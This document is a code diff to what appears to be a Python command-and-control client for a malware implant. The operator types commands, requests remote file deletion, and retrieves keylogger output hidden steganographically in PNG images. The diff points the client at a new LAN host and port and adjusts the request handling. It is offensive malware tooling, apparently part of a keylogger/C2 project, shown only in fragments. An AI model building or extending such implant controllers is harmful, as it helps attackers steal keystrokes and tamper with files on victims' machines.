@@ -6,15 +6,15 @@ import os
 import base64
 from utils import *
 
-host = "localhost"
-port = 5000
+host = "192.168.20.4"
+port = 9000
 
 baseurl = f'http://{host}:{port}'
 
 s = socket.socket()
 # host = "18.223.121.137"  # Get local machine name
-host = "127.0.0.1"
-port = 5000  # Reserve a port for your service
+# host = "127.0.0.1"
+# port = 5000  # Reserve a port for your service
 while True:  # Establish connection with client
     message = input("Enter command to the implant:\n")
     if message == "exit":
@@ -40,15 +40,15 @@ while True:  # Establish connection with client
         continue
     if 'delete ' in message:
         filename = message.replace('delete ','').strip()
-        ret = requests.post(urljoin(baseurl, '/delete'), json={'filename': filename})
+        ret = requests.post(urljoin(baseurl, '/delete'), headers={'Content-type':'application/json'}, json={'filename':filename})
         print(ret.text)
     if 'getkeylogger' in message:
         data = requests.get(urljoin(baseurl, '/getkeylogger')).text
         with open('/tmp/tmpkeylogger.png','wb') as f:
             f.write(base64.b64decode(data))
         data = stegano_decrypt('/tmp/tmpkeylogger.png')
-        # print(data)
         print(data)
+        continue
     if " " not in message:
         print("please input the format of [command] [post_body], post body is optional but space is mandatory")
         continue
